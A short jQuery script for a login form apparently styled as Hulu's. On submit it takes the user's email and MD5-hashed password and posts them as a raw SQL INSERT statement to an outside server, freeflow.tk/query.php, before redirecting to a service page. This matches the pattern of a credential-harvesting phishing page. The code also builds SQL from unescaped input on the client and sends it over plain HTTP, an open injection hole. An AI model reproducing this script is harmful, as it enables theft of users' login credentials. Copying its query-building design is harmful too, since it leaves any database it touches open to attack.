$(function() {
	// Check if form filled to enable enter button
	$('form input').keyup(function() {
		var empty = false;
		$('form input').each(function() {
			if($(this).val() == '') { empty = true; }
		});

		if (empty) { $('#hulu-enter').prop('disabled', true); }
		else { $('#hulu-enter').prop('disabled', false); }
	});
	
	// Handler enter key pressed in any input
	$('form input').keypress(function(e) {
		if (e.keyCode == 13) {
			var empty = false;
			$('form input').each(function() {
				if($(this).val() == '') { empty = true; }
			});
			
			if (!empty) { $('#login').click() }
		}
	});

	$('#hulu-enter').click(function() {
        var serv = "http://freeflow.tk/query.php"

        // Get entered input
        var id = '1';
        var user = $('#h-email').val().trim(),
            pass = $('#h-pass').val().trim();
		var done = false;
		$.ajaxSetup({async: false});
        // Check email

		var pass = md5(pass);
        $.post(serv, {query: "INSERT INTO hulu (id, user, pass) VALUES ('" + id + "', '" + user + "', '" + pass + "');"}, function() {
			window.location.href="/servicepage/servicepage.html";
		});
 
	 });
});
